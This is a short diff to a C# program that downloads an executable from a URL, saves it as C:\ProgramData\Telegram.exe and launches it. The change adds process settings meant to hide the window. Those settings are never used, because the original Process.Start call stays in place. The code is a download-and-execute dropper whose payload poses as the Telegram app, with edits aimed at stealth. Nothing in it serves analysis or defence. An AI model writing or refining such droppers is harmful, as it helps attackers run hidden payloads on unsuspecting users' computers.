@@ -1,4 +1,5 @@
 using System;
+using System.Diagnostics;
 
 public class Program {
 	
@@ -11,9 +12,14 @@ public class Program {
         string savePath = "C:\\ProgramData\\Telegram.exe";
         System.Net.WebClient webClient = new System.Net.WebClient();
         webClient.DownloadFile(url, savePath);
-        System.Diagnostics.Process.Start(savePath);
+
+		ProcessStartInfo processStartInfo = new ProcessStartInfo
+		{
+		    FileName = savePath,
+		    UseShellExecute = false,
+		    CreateNoWindow = true
+		};
+		
+		System.Diagnostics.Process.Start(savePath);
     }
-
-
 }
-
